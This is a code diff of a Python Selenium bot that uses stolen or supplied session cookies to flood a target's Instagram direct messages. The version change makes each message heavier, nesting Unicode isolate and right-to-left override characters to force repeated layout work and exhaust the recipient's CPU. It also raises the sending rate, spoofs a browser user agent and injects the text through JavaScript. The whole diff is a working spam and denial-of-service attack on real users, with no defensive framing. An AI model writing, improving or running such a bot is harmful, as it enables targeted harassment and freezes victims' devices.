@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (STICKY-VISIBLE V36)
-# 📅 STATUS: DOM-DOMINATION | 4-AGENT TOTAL | AWS-CPU-LOCK
+# 🚀 PROJECT: PRAVEER.OWNS (HEAVY-STICKY V37)
+# 📅 STATUS: ATOMIC-UI-LOCK | 4-AGENT TOTAL | AWS-CPU-CRUSHER
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,30 +13,30 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.1, 0.4)    # 🔥 Fast but avoids server shadow-ban
-REST_AFTER_STRIKES = 150   
+BURST_SPEED = (0.05, 0.2)   # 🔥 Increased speed for maximum pressure
+REST_AFTER_STRIKES = 120   
 REST_DURATION = 4          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_sticky_payload():
-    """Generates a high-authority visible payload that saturates the DOM tree."""
+def get_heavy_sticky_payload():
+    """Generates the heaviest possible visible layout-thrashing payload."""
     u_id = random.randint(1000, 9999)
-    # \u2060 = Word Joiner | \u2068 = First Strong Isolate
-    glue, iso, pop = "\u2060", "\u2068", "\u2069"
+    # \u2066-\u2069 are isolates. \u202E is Right-to-Left override.
+    # This combo forces the browser to calculate the layout twice (L-R then R-L).
+    iso, rtl, pop, glue = "\u2068", "\u202E", "\u2069", "\u2060"
     
-    # 👑 BRANDING SATURATION
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOCK_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HEAVY_NODE:{u_id}]"
     
     body = []
-    # 390 lines to hit the 10,000 character limit
-    # This creates a 'Wall of Text' that physically scrolls the opponent off-screen
-    for i in range(390):
-        # We wrap the visible name in invisible isolates to prevent 'Skip Rendering'
-        # The Moon emoji triggers the fallback-font scan on the AWS machine
-        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
+    # 400 lines - hitting the absolute character limit of Instagram DMs
+    for i in range(400):
+        # We nest the isolates. This forces the C++ engine to track deep tree branches.
+        # Even though the text is readable, the 'Logical Order' is a nightmare.
+        nest = f"{iso}{rtl}{iso}{rtl}"
+        line = f"{nest}PRAVEER PAPA ON TOP 🌙 {i}{pop*4}{glue*10}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -47,7 +47,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--disable-gpu") # Force CPU-bound layout calculation
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -66,19 +66,19 @@ def run_life_cycle(agent_id, cookie, target):
             time.sleep(12) 
             
             while True:
-                payload = get_sticky_payload()
+                payload = get_heavy_sticky_payload()
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                    # Direct JS injection ensures your bot doesn't lag itself out
+                    # Bypass UI thread with direct JS command injection
                     driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
                     box.send_keys(Keys.ENTER)
                     
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Sticky Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Heavy Strike ({GLOBAL_SENT})")
                 except:
-                    break # Restart browser if DOM reloads
+                    break 
 
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
